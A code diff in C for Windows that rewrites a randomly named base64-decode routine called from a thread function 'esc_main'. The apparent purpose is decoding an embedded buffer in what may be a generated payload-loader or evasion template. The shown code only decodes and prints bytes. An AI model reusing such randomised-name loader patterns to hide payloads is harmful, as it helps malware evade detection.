@@ -8,84 +8,53 @@
 
 //####DEFINE####
 
-int base64_decode_f328998ea23d451c8275c4ed3a69ba2e(unsigned char* data, int data_len)
+int base64_decode_f120c5e21f6e400bb3f40b6119bbe704(unsigned char* encoded, int length)
  {
-    DWORD base64_len = 0;
-    BOOL result;
 
-    // Step 1: Convert hex representation to Base64 encoded string
 
-    // Get the required size for the base64 encoded string
-    printf("\n");
-    printf("DEBUG:Before B64:");
-    for (size_t i = 0; i < data_len; i++) {
-        printf("0x%02x,", data[i]);
+    printf("\n[*] Before BASE64 values: {");
+    for (DWORD i = 0; i < length; i++) {
+        printf("0x%02x", encoded[i]);
+        if (i < length - 1) {
+            printf(",");
+        }
     }
-    printf("\n\n");
+    printf("}\n");
 
-    if (!CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64_len)) {
-        fprintf(stderr, "Error getting required size for base64 encoding. Error code: %lu\n", GetLastError());
-        return -1;
-    }
-
-    // Allocate memory for the base64 encoded string
-    unsigned char* base64_encoded = (unsigned char*)malloc(base64_len);
-    if (base64_encoded == NULL) {
-        fprintf(stderr, "Memory allocation failed\n");
-        return -1;
-    }
-
-    // Perform the conversion to base64
-    if (!CryptBinaryToStringA(data, data_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (LPSTR)base64_encoded, &base64_len)) {
-        fprintf(stderr, "Error converting hex to base64. Error code: %lu\n", GetLastError());
-        free(base64_encoded);
-        return -1;
-    }
-
-    // Print the Base64 string
-    printf("Base64 encoded data: %.*s\n", base64_len, base64_encoded);
-
-    // Step 2: Decode the Base64 string
-    DWORD decoded_len = 0;
-
-    // First, call CryptStringToBinaryA to get the required size for the decoded data
-    result = CryptStringToBinaryA((LPCSTR)base64_encoded, base64_len, CRYPT_STRING_BASE64, NULL, &decoded_len, NULL, NULL);
+    DWORD dwDecodedSize = 0;
+    BOOL result = CryptStringToBinaryA((LPCSTR)encoded, length, CRYPT_STRING_BASE64, NULL, &dwDecodedSize, NULL, NULL);
     if (!result) {
-        fprintf(stderr, "Error getting decoded length. Error code: %lu\n", GetLastError());
-        free(base64_encoded);
+        printf("[-] Error calculating decoded size\n");
         return -1;
     }
 
-    unsigned char* decoded_data = (unsigned char*)malloc(decoded_len);
-    if (decoded_data == NULL) {
-        fprintf(stderr, "Memory allocation failed\n");
-        free(base64_encoded);
+    unsigned char* decoded = (unsigned char*)malloc(dwDecodedSize);
+    if (decoded == NULL) {
+        printf("[-] Memory allocation failed\n");
         return -1;
     }
 
-    // Now, decode the base64 data
-    result = CryptStringToBinaryA((LPCSTR)base64_encoded, base64_len, CRYPT_STRING_BASE64, decoded_data, &decoded_len, NULL, NULL);
+    result = CryptStringToBinaryA((LPCSTR)encoded, length, CRYPT_STRING_BASE64, decoded, &dwDecodedSize, NULL, NULL);
     if (!result) {
-        fprintf(stderr, "Error decoding base64 data. Error code: %lu\n", GetLastError());
-        free(base64_encoded);
-        free(decoded_data);
+        printf("[-] Error decoding base64\n");
+        free(decoded);
         return -1;
     }
 
-    // Copy the decoded data back to the original data buffer
-    memcpy(data, decoded_data, decoded_len);
-
-    printf("\n");
-    printf("DEBUG:After B64:");
-    for (size_t i = 0; i < data_len; i++) {
-        printf("0x%02x,", data[i]);
+    // Debug statement to print the decoded values
+    printf("\n[*] After BASE64 values: {");
+    for (DWORD i = 0; i < dwDecodedSize; i++) {
+        printf("0x%02x", decoded[i]);
+        if (i < dwDecodedSize - 1) {
+            printf(",");
+        }
     }
-    printf("\n\n");
+    printf("}\n");
 
-    free(base64_encoded);
-    free(decoded_data);
+    memcpy(encoded, decoded, dwDecodedSize);
+    free(decoded);
 
-    return decoded_len;
+    return dwDecodedSize;
 }
 
 
@@ -101,7 +70,7 @@ DWORD WINAPI esc_main(LPVOID lpParameter)
     memcpy(encoded, raw, length);
     //SIZE_T bytesWritten;
 
-    length = base64_decode_f328998ea23d451c8275c4ed3a69ba2e(encoded, length);
+    length = base64_decode_f120c5e21f6e400bb3f40b6119bbe704(encoded, length);
 
     unsigned char* decoded = encoded;
 
